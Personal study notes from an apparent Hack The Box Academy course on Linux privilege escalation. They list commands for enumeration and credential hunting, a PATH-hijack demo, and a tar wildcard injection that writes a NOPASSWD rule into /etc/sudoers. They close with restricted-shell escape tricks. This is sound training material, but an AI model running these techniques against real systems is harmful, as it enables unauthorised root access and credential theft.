# Hack The Box academy Linux Privilege Escalation notes
## Introduction to Linux Privilege Escalation
### Short list
* basic things to check
  * OS version, kernel version, running services
* basic commands
  * ps aux | grep root (root processes)
  * ps au (similar than ps aux)
  * ls -la /, ls -la /home, ls -la /home/user1, ls -la /home/user1/.ssh
  * history, sudo -l, crontab -l, cat /etc/*cron*, ls -la /etc/*cron*
  * cat /etc/passwd, cat /etc/shadow
  * lsblk (Unmounted File Systems and Additional Drives)
  * setuid-, setgid permissions
  * writeable directories
    * find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
  * writeable files
    * find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
### some detailed info
* OS Version: Knowing the distribution (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.) will give you an idea of the types of tools that may be available. This would also identify the operating system version, for which there may be public exploits available.
* Kernel Version: As with the OS version, there may be public exploits that target a vulnerability in a specific kernel version. Kernel exploits can cause system instability or even a complete crash. Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.
* Running Services: Knowing what services are running on the host is important, especially those running as root. A misconfigured or vulnerable service running as root can be an easy win for privilege escalation. Flaws have been discovered in many common services such as Nagios, Exim, Samba, ProFTPd, etc. Public exploit PoCs exist for many of them, such as CVE-2016-9566, a local privilege escalation flaw in Nagios Core < 4.2.4.
## Environment Enumeration
* whoami, id, hostname, ifconfig (or ip a), sudo -l
* cat /etc/os-release (new or old linux system is used?) (if old, maybe it has known vulnerabilities)
* echo $PATH
* env
* uname -a (or cat /proc/version) (kernel version)
* lscpu (CPU type and version)
* cat /etc/shells (what shells are available?) (tmux and screen could be vulnerable!!)
* during enumeration we should note any defense system we found
  * e.g.: Exec Shield, iptables, AppArmor, SELinux, Fail2ban, Snort, Uncomplicated Firewall (ufw)
  * enumerating these systems not always works (because the lack of privileges)
  * but knowing them exist can help our strategy (not to test things that has extra defense...)
* lsblk (list hard disks, USB drives, optical drives, etc.)
* lpstat (printers)
* cat /etc/fstab (mounted and unmounted drives)
* route (or netstat -rn) (routing tables)
* /etc/resolv.conf (dns information) (important in domain environment !!!)
* arp -a
* cat /etc/passwd, cat /etc/shadow, cat /etc/group
* cat /etc/passwd | grep "*sh$" (users with shell)
  * some shell version is vulnerable (like bash v4.1 is vulnerable to shellshock)
* getent group group_name1 (lists members of a group)
* check the content of folders in home folders
* check configuration files
  * ends with .conf or .config
  * grep for usernames, passwords, credentials, secrets, ...
* if we found passwords we should try them for all users - maybe it will be working with one of them
* mounting and unmounting filesystems
  * by default it needs root priv to mount and umount file systems
    * for lateral movement the root access is the key to check everything to move on to the next system
* df -h (list mounted file systems)
* cat /etc/fstab | grep -v "#" | column -t (view unmounted file systems)
* find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep user1 (list all hidden files)
* find / -type d -name ".*" -ls 2>/dev/null (list all hidden directories)
* temporary directories
  * /tmp, /var/tmp
  * all users can read the contents of these folders (by default)
* ls -l /tmp /var/tmp /dev/shm (list temporary files)
## Linux Services & Internals Enumeration
### Internals
<pre>
# basic commands
ip a, ifconfig, cat /etc/hosts, history, ls -la /etc/cron.daily/
lastlog (ki mikor jelentkezett be)
who, finger (ki van most eppen bejelentkezve)

# finding history files
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
</pre>
The proc filesystem (proc / procfs) is a particular filesystem in Linux that contains information about system processes, hardware, and other system information. It is the primary way to access process information and can be used to view and modify kernel settings. It is virtual and does not exist as a real filesystem but is dynamically generated by the kernel. It can be used to look up system information such as the state of running processes, kernel parameters, system memory, and devices. It also sets certain system parameters, such as process priority, scheduling, and memory allocation.  
<pre>
# print proc information
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
</pre>
### Services
If it is a slightly older Linux system, the likelihood increases that we can find installed packages that may already have at least one vulnerability. However, current versions of Linux distributions can also have older packages or software installed that may have such vulnerabilities. Therefore, we will see a method to help us detect potentially dangerous packages in a bit. To do this, we first need to create a list of installed packages to work with.  
<pre>
# installed packages
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

# sudo version
sudo -V

# list binary files on the system
ls -l /bin /usr/bin/ /usr/sbin/

# list GTFO bins on the system
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done

# trace system calls
strace ./file1

# check configuration files
# if a file has read permissions for everyone, we can still read the file even if we do not have permission to read the folder.
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

# find scripts on the system
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

# running services by user
# it a script created by the administrator in his path and whose rights have not been restricted, we can run it without going into the root directory.
ps aux | grep root
</pre>
## Credential Hunting
<pre>
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
ls ~/.ssh
</pre>
## Path Abuse
Adding . to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as ls with a malicious script such as a reverse shell. If we add . to the path by issuing the command PATH=.:$PATH and then export PATH, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing ls will call the malicious script named ls in the current working directory instead of the binary located at /bin/ls).  
We modify the path to run a simple echo command when the command ls is typed
<pre> 
# print path env var
htb_student@NIX02:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

# add current working directory '.' to the path env var
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

# create local 'ls' command
htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls

#calling ls will call the local ls instead of the standard ls command!
htb_student@NIX02:~$ ls
PATH ABUSE!!
</pre>
## Wildcard Abuse
An example of how wildcards can be abused for privilege escalation is the tar command, a common program for creating/extracting archives. If we look at the man page for the tar command, we see the following:  
<pre>
htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
</pre>
The --checkpoint-action option permits an EXEC action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, --checkpoint=1 and --checkpoint-action=exec=sh root.sh is passed to tar as command-line options. Let's see this in practice.  
Consider the following cron job, which is set up to back up the /home/htb-student directory's contents and create a compressed archive within /home/htb-student. The cron job is set to run every minute, so it is a good candidate for privilege escalation.  
<pre>
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
</pre>
We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.  
<pre>
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
</pre>
We can check and see that the necessary files were created.  
<pre>
htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
</pre>
Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.  
<pre>
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
</pre>
## Escaping Restricted Shells
### Intro
* A restricted shell is a type of shell that limits the user's ability to execute commands. In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories. Restricted shells are often used to provide a safe environment for users who may accidentally or intentionally damage the system or provide a way for users to access only certain system features. Some common examples of restricted shells include the rbash shell in Linux and the "Restricted-access Shell" in Windows.
* Common Restricted shells: Restricted Bourne shell (rbash), Restricted Korn shell (rksh), Restricted Z shell (rzsh)
### Escaping Techniques
#### Our own testing techniques
* base64 trick
  * on our attack machine we write the full command we want to run, and make a base64 code of it
  * on victim machine we echo the base64 code and chain it with base64 -d and put the whole thing to $()
  * it will decode the command and will be run it
  * we use only base64-d, the pipe (|) and the $() things (if these are enabled, we are good to go)
* using '**echo**' insted of **cat** and **ls**
<pre>
# list files in working directory with 'echo'
$ echo *
htb-user@ubuntu:~$ echo *
bin flag.txt

# list files in other directory (e.g. / directory)
htb-user@ubuntu:~$ echo /*
/bin /boot /cdrom /dev /etc /home /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /root /run /sbin /snap /srv /sys /tmp /usr /var

# list files in arbit any other directory (e.g. /home directory)
htb-user@ubuntu:~$ echo /home/*
/home/htb-user /home/lab_adm

# print file content with 'echo' (relative path)
htb-user@ubuntu:~$ echo "$(<flag.txt)"
HTB{35c4p3_7h3_r3stricted_5h311}

# print file content with 'echo' and 'pwd' (absolute path)
htb-user@ubuntu:~$ export TEST=$(pwd)/flag.txt
htb-user@ubuntu:~$ echo $TEST
/home/htb-user/flag.txt
htb-user@ubuntu:~$ echo "$(<$TEST)"
HTB{35c4p3_7h3_r3stricted_5h311}

# print file content with 'echo' (absolute path)
htb-user@ubuntu:~$ export TEST=/etc/hosts
htb-user@ubuntu:~$ echo "$(<$TEST)"
127.0.0.1 localhost
127.0.1.1 ubuntu
...
</pre>
#### Command injection
Imagine that we are in a restricted shell that allows us to execute commands by passing them as arguments to the ls command. Unfortunately, the shell only allows us to execute the ls command with a specific set of arguments, such as ls -l or ls -a, but it does not allow us to execute any other commands. In this situation, we can use command injection to escape from the shell by injecting additional commands into the argument of the ls command.  
For example, we could use the following command to inject a pwd command into the argument of the ls command:  
<pre>
mrFiSHER@htb[/htb]$ ls -l `pwd` 
</pre>
This command would cause the ls command to be executed with the argument -l, followed by the output of the pwd command. Since the pwd command is not restricted by the shell, this would allow us to execute the pwd command and see the current working directory, even though the shell does not allow us to execute the pwd command directly.  
#### Command Substitution
Another method for escaping from a restricted shell is to use command substitution. This involves using the shell's command substitution syntax to execute a command. For example, imagine the shell allows users to execute commands by enclosing them in backticks (`). In that case, it may be possible to escape from the shell by executing a command in a backtick substitution that is not restricted by the shell.  
#### Command Chaining
In some cases, it may be possible to escape from a restricted shell by using command chaining. We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell.  
#### Environment Variables
For escaping from a restricted shell to use environment variables involves modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell. For example, if the shell uses an environment variable to specify the directory in which commands are executed, it may be possible to escape from the shell by modifying the value of the environment variable to specify a different directory.  
#### Shell Functions
In some cases, it may be possible to escape from a restricted shell by using shell functions. For this we can define and call shell functions that execute commands not restricted by the shell. Let us say, the shell allows users to define and call shell functions, it may be possible to escape from the shell by defining a shell function that executes a command.  
## Special Permissions
